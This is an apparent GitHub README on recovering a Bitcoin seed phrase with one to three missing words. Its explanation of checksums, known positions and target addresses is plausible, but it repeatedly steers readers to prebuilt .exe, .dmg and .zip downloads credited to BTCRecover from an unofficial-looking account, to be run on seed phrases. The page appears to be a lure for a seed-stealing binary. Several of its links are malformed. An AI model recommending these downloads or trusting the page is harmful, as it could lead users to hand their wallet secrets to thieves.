<div align="center">
<img src="assets/banner-article.png" alt="Recover a seed phrase with 1-3 missing words">
</div>

# Recover a seed phrase with 1-3 missing words

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A phrase with one to three words missing is recoverable because each empty position is a bounded question: 2,048 possible words in the standard list, narrowed further by the phrase's own checksum. BTCRecover fills the gaps, tests each candidate against an address that belongs to the wallet, and does it all offline on your own machine.

## You'll see this if

You wrote the phrase down incompletely, or part of the paper is gone, and you know roughly how much is missing. The count of unknown words is the single most useful number you can establish, because it decides whether the search is an evening or a month.

| What you have | Search size, roughly | Realistic route |
|---|---|---|
| 11 of 12 words, position known | 2,048 candidates, minus those failing the checksum | minutes of local work |
| 10 of 12 words, positions known | millions of pairs, heavily filtered by the checksum | hours, and worth running |
| 12 of 24 words | an enormous space; the checksum helps, the address decides | only with strong extra constraints |
| Words present but the count is wrong | not a missing-word problem | identification first |
| One word written twice by mistake | one unknown position plus a duplicate | treat the duplicate as the unknown |

Two honest limits belong here rather than at the end. The checksum in a standard phrase removes most invalid combinations for free, which is why one missing word is easy. It does not scale: each additional unknown word multiplies the work, so three missing words from a 24-word phrase is a different undertaking from one missing word from a 12-word phrase.

## Why it happens

A standard phrase is not an arbitrary list of words. The last word encodes a checksum over all the others, so a candidate phrase can be tested for internal consistency before any wallet is derived  -  a free filter that discards the overwhelming majority of wrong guesses instantly.

That is the whole mechanism, and it explains the shape of the problem. If you know which positions are empty, the search is over the words that could fill them. If you do not know which positions, the search is over both the words and their placement, which is why writing down what you are certain of  -  "word 4 and word 9 missing"  -  is worth more than an extra guess about the words themselves.

A target address turns a consistent phrase into a confirmed one. Checksum-valid candidates are not necessarily your phrase; only deriving the wallet and matching an address proves it. That is why the address step comes before the search, not after: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md) covers how to recover one from your own records.

## Fix

Establish the positions, then the candidate words, then the target, and only then run the search.

1. **Lay the phrase out with numbered positions.** Blank lines for the words you do not have. This converts "I think I'm missing a couple" into "positions 4 and 11 are empty", which changes the search completely.
2. **Count the words the wallet expects.** Twelve, eighteen or twenty-four for a standard phrase; thirteen or sixteen for some legacy formats. A phrase that is short because the format is different is not a missing-word problem at all.
3. **Write down candidate words for each gap.** Words you half-remember, words that sound right, words from the same semantic area as the rest  -  pets, places, objects. A short per-position candidate list is far cheaper than the full 2,048.
4. **Find an address that belongs to the wallet.** The first receive address of the account, from a record or an app. Every candidate gets checked against it: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
5. **Download the current release from the GitHub releases page** and run the seed search offline, marking the unknown positions and the candidate lists: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Let the checksum and the address do the filtering.** The run reports candidates as it narrows them; a long silence early on is normal, because most of the space is being discarded for free.
7. **Confirm before moving anything.** Restore the completed phrase into a clean wallet, check the address matches, then move the balance to a wallet you have backed up properly this time.

If the words came from a phrase where the order is also uncertain, stop and settle that first: a search over positions and a search over permutations are two different runs, and mixing them multiplies the space for no benefit. [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md) is the page for that case.

## If that did not work

A run that finishes empty usually means the target is wrong, the positions are wrong, or a candidate word is not in the list you assumed.

Check the address before anything else  -  an address from a different account in the same wallet fails against a correct phrase. Then confirm the positions: if the phrase had a word repeated and you marked one copy as unknown, or if the missing words were at the end and you assumed the middle, the search never covers the real answer. Then widen the candidate lists, not the positions. And if the phrase is from a wallet that did not use the standard list, the checksum filter is not helping at all and the format needs identifying first: [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md).

Where the gap is larger than three words, the honest answer is that a blind search is not viable, and the route becomes constraint-hunting: an old screenshot, a partial transcription in an email, a second copy of the backup. [A run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md)) lists what to check in order.

## Prevention

- Write the phrase on paper or metal, in order, with the positions numbered.
- Verify the backup by restoring it **before** the wallet holds anything of value.
- Keep a second copy in a different physical place, and check both once a year.
- Record the wallet type and year with the backup, so a future search knows which format to expect.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can a seed phrase with missing words be recovered?

Yes, when the gaps are few and the positions are known  -  one to three words is the range this is built for. The phrase's checksum filters most wrong combinations for free, and a known address confirms the right one.

### I have 11 of my 12 words and my address. What is the first step?

Number the positions, write the 11 words in place, and put your known address beside them. Those two things  -  the empty position and the target  -  turn the problem into a search that can finish in minutes.

### What if I only remember the first 10 of my 12 words?

That is two unknown positions at the end, which is a much larger space than one but still bounded, and the checksum removes most of it. Run it with the full word list for the two gaps before assuming it is hopeless.

### Does the wallet type matter when words are missing?

Yes. The wallet type decides which word list and which derivation apply, so the same 11 words can be correct and still fail against the wrong target. Identify the wallet before starting the search.

### Can I recover a phrase missing more than three words?

Only with extra constraints  -  a partial transcription, a screenshot, a second backup, or knowledge of the missing words' first letters. Without something like that, the space grows faster than any machine closes it.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [How to find a lost Bitcoin wallet address]([How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md))
- [Seed words in the wrong order]([Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md))
- [Invalid recovery phrase]([Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md))
